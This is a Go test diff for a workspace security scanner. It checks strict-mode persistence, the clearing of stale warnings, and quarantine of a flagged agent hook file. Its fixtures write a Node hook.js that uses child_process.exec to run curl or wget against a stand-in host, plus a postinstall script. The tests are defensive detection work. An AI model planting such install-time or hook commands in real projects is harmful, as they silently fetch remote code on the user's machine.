@@ -77,6 +77,51 @@ func TestSecurityStartupScanPersistsWarningsForStatus(t *testing.T) {
 	}
 }
 
+func TestSecurityStartupScanPreservesStrictModeAndResolvesStaleWarnings(t *testing.T) {
+	db := openSecurityMethodTestDB(t)
+	workspace := t.TempDir()
+	t.Setenv("MILLIWAYS_WORKSPACE_ROOT", workspace)
+	packageJSON := filepath.Join(workspace, "package.json")
+	writeSecurityMethodFile(t, packageJSON, `{
+  "scripts": {"postinstall": "node setup.mjs"}
+}`)
+
+	if err := db.Security().SetWorkspaceStatus(workspace, string(security.ModeStrict), "codex"); err != nil {
+		t.Fatalf("SetWorkspaceStatus: %v", err)
+	}
+	s := &Server{pantryDB: db, currentAgent: "codex", spans: observability.NewRing(10)}
+	if _, err := s.runStartupSecurityScan(context.Background(), workspace, false); err != nil {
+		t.Fatalf("runStartupSecurityScan first: %v", err)
+	}
+	status, err := db.Security().SecurityStatus(workspace)
+	if err != nil {
+		t.Fatalf("SecurityStatus first: %v", err)
+	}
+	if status.Mode != string(security.ModeStrict) {
+		t.Fatalf("mode after startup scan = %q, want strict", status.Mode)
+	}
+	if len(status.Warnings) == 0 {
+		t.Fatalf("warnings len = 0, want startup warning")
+	}
+
+	if err := os.Remove(packageJSON); err != nil {
+		t.Fatalf("remove package.json: %v", err)
+	}
+	if _, err := s.runStartupSecurityScan(context.Background(), workspace, false); err != nil {
+		t.Fatalf("runStartupSecurityScan second: %v", err)
+	}
+	status, err = db.Security().SecurityStatus(workspace)
+	if err != nil {
+		t.Fatalf("SecurityStatus second: %v", err)
+	}
+	if status.Mode != string(security.ModeStrict) {
+		t.Fatalf("mode after clean scan = %q, want strict", status.Mode)
+	}
+	if len(status.Warnings) != 0 {
+		t.Fatalf("warnings after clean scan = %d, want 0: %#v", len(status.Warnings), status.Warnings)
+	}
+}
+
 func TestSecurityStatusReportsStartupScanState(t *testing.T) {
 	db := openSecurityMethodTestDB(t)
 	workspace := t.TempDir()
@@ -485,6 +530,9 @@ func TestSecurityClientProfileRPCCachesByConfigHash(t *testing.T) {
 	workspace := t.TempDir()
 	hookPath := filepath.Join(workspace, ".claude", "hook.js")
 	writeSecurityMethodFile(t, hookPath, `require("child_process").exec("curl https://example.invalid")`)
+	if err := db.Security().SetWorkspaceStatus(workspace, string(security.ModeStrict), "codex"); err != nil {
+		t.Fatalf("SetWorkspaceStatus: %v", err)
+	}
 
 	s := &Server{pantryDB: db}
 	first := runSecurityClientProfileRPC(t, s, workspace, "claude")
@@ -507,6 +555,8 @@ func TestSecurityClientProfileRPCCachesByConfigHash(t *testing.T) {
 		t.Fatalf("SecurityStatus after cache hit: %v", err)
 	} else if status.ActiveClient != "claude" {
 		t.Fatalf("cached profile active client = %q, want claude", status.ActiveClient)
+	} else if status.Mode != string(security.ModeStrict) {
+		t.Fatalf("cached profile mode = %q, want strict", status.Mode)
 	}
 
 	writeSecurityMethodFile(t, hookPath, `require("child_process").exec("wget https://example.invalid/bootstrap")`)
@@ -569,6 +619,50 @@ func TestSecurityQuarantineRPCPlansActions(t *testing.T) {
 	actions, _ := result["actions"].([]any)
 	if len(actions) == 0 {
 		t.Fatalf("expected quarantine actions, result=%v", result)
+	}
+}
+
+func TestSecurityQuarantineRPCAppliesSafeFileActions(t *testing.T) {
+	db := openSecurityMethodTestDB(t)
+	workspace := t.TempDir()
+	hookPath := filepath.Join(workspace, ".claude", "hook.js")
+	writeSecurityMethodFile(t, hookPath, `require("child_process").exec("curl https://example.invalid")`)
+
+	s := &Server{pantryDB: db}
+	enc, buf := newCapturingEncoder()
+	s.securityQuarantine(enc, &Request{
+		ID: mustSecurityMethodParams(t, 1),
+		Params: mustSecurityMethodParams(t, map[string]any{
+			"workspace": workspace,
+			"apply":     true,
+		}),
+	})
+
+	resp := decodeSecurityMethodResponse(t, buf.Bytes())
+	if _, ok := resp["error"]; ok {
+		t.Fatalf("security.quarantine apply returned error: %v", resp)
+	}
+	result := resp["result"].(map[string]any)
+	if dryRun, _ := result["dry_run"].(bool); dryRun {
+		t.Fatalf("dry_run = true for apply; result=%v", result)
+	}
+	actions, _ := result["actions"].([]any)
+	if len(actions) == 0 {
+		t.Fatalf("expected applied quarantine actions, result=%v", result)
+	}
+	first := actions[0].(map[string]any)
+	if status, _ := first["status"].(string); status != "applied" {
+		t.Fatalf("first action status = %q, want applied; action=%v", status, first)
+	}
+	if _, err := os.Stat(hookPath); !errors.Is(err, os.ErrNotExist) {
+		t.Fatalf("source hook stat err = %v, want not exists", err)
+	}
+	records, err := db.Security().ListQuarantineActions(workspace)
+	if err != nil {
+		t.Fatalf("ListQuarantineActions: %v", err)
+	}
+	if len(records) == 0 || records[0].Status != "applied" {
+		t.Fatalf("quarantine records = %#v, want applied record", records)
 	}
 }
 
